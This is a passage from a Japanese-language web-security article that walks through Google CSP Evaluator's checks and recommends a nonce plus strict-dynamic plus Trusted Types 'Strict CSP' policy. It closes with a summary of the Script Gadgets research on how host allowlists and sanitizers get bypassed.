> - "[directive] directive has an IP-Address as source: [host] (will be ignored by browsers!)."

CSPのホストソースにIPアドレスを書いても**ブラウザは無視する**（ホスト名として解釈されない）点への注意喚起。

**(11) 非推奨ディレクティブ（`checkDeprecatedDirective`）— INFO**
> - "reflected-xss is deprecated since CSP2. Please, use the X-XSS-Protection header instead."
> - "referrer is deprecated since CSP2. Please, use the Referrer-Policy header instead."
> - "disown-opener is deprecated since CSP3. ..."
> - "prefetch-src is deprecated since CSP3. ..."

**(12) nonce長・文字集合（`checkNonceLength`）— MEDIUM / INFO**
> - "Nonces should be at least 8 characters long." （MEDIUM）
> - "Nonces should only use the base64 charset." （INFO）

短いnonceは推測されうる。第3節の Ractive のnonce窃取とは別問題だが、「nonceの強度」もCSPの前提であることを示す。

**(13) HTTP送信（`checkSrcHttp`）— MEDIUM**
> "Use HTTPS to send violation reports securely." / "Allow only resources downloaded over HTTPS."

**Strict CSP系（`strictcsp_checks.ts`）— 主に STRICT_CSP（改善提案）:**

**(14) strict-dynamic推奨（`checkStrictDynamic`）— STRICT_CSP**
> "Host allowlists can frequently be bypassed. Consider using 'strict-dynamic' in combination with CSP nonces or hashes."

これがツール全体の中心メッセージ。「**ホスト許可リストは頻繁にバイパスされうる**」――まさに Script Gadgets 研究が実証したこと――ので、nonce/hash と `strict-dynamic` の組合せへ移行せよ、という提案。

**(15) strict-dynamic単独の警告（`checkStrictDynamicNotStandalone`）— INFO**
> "'strict-dynamic' without a CSP nonce/hash will block all scripts."

**(16) 後方互換フォールバック（`checkUnsafeInlineFallback` / `checkAllowlistFallback`）— STRICT_CSP**
> - "Consider adding 'unsafe-inline' (ignored by browsers supporting nonces/hashes) to be backward compatible with older browsers."
> - "Consider adding https: and http: url schemes (ignored by browsers supporting 'strict-dynamic') to be backward compatible with older browsers."

nonce/strict-dynamic対応ブラウザは `unsafe-inline` や `http:/https:` フォールバックを**無視する**という仕様を逆手に取り、旧ブラウザ向けの互換性を安全に確保する定石。

**(17) Trusted Types推奨（`checkRequiresTrustedTypesForScripts`）— INFO**
> "Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding \"require-trusted-types-for 'script'\" to your policy."

Script Gadgets が突いた「DOMのsinkに文字列が流れ込む」問題を、根本から縛る Trusted Types への誘導。原典の "secure-by-default" 提言の実装形である。

#### 6.4 推奨される「Strict CSP」

上記の検査群が最終的に勧める理想形はこうだ。

```
Content-Security-Policy:
  script-src 'nonce-{ランダム値}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  require-trusted-types-for 'script';
```

- **なぜ有効か**: `'strict-dynamic'` はブラウザに**ホスト許可リストを完全に無視**させ、「nonce/hashが一致した信頼スクリプトが動的生成したスクリプトはその信頼を継承する」という**伝播ベースの信頼モデル**へ切り替える。これで「どのホストにgadgetがあるか」という問題設定そのものが消える。`https:` と `'unsafe-inline'` は、nonce非対応の旧ブラウザ向けフォールバック（対応ブラウザは無視）。`base-uri 'none'` は `<base>` すり替えを封じ、`object-src 'none'` はプラグイン経由実行を封じる。`require-trusted-types-for 'script'` はDOM XSSのsinkを型で縛る。逆に言えば、**ホスト許可リスト方式を使い続ける限り、Script Gadgetsによるバイパスの理論的リスクは残る**――これが CSP Evaluator と Black Hat 論文に共通する最終メッセージである。

> 出典: CSP Evaluator（github.com/google/csp-evaluator, checks/security_checks.ts, checks/strictcsp_checks.ts, allowlist_bypasses/*.ts）— https://csp-evaluator.withgoogle.com/

---

### 7. まとめ：この節の核心

- **Script Gadgets研究（Black Hat/CCS 2017）**は、「CSP・サニタイザ・XSSフィルタ・WAFは、構文（タグ・属性・URLスキーム）しか見ておらず、ページ上の正規JavaScriptが持つ『意味』までは検証できない」という構造的限界を、**16ライブラリ・Alexa上位5,000サイト**で実証した。フレームワーク×緩和策の **53.13%** でバイパスが成立し、Alexa上位の約 **20%（906ドメイン）** で実際に有効なgadgetを検証した。
- 特に**式パーサ内蔵フレームワーク（AngularJS 1.x・Aurelia・Polymer 1.x）**は、`<script>`も`eval`も使わずに**すべての**緩和策をバイパスできた。gadgetを唯一持たなかったのは、デフォルト安全設計の **React** だった。
- **CSP Evaluator**は、この研究成果を「機械的に検出できる危険パターン」に落とし込んだ実務ツールである。`unsafe-inline`（HIGH）、広すぎるホスト許可（HIGH）、`base-uri`欠落（HIGH）、そして**既知のJSONP/AngularJS/Flash配信ホストを許可していないか**（HIGH）を具体的に指摘し、最終的に **nonce + strict-dynamic + Trusted Types** の「Strict CSP」へ導く。
- この節の最重要ポイントは、**「CSPを設定した」「サニタイザを通した」という事実だけでは、ページ上に存在する正規コードの挙動まで保証されない**ということ。防御の本質は、緩和策の積み増しではなく、Black Hat論文が説く **secure-by-default**（デフォルトで安全なプラットフォーム／フレームワーク／API）への移行にある。次節以降では、この考え方を発展させ、DOM Clobbering やコード再利用攻撃（Code-Reuse）の具体例をさらに掘り下げる。
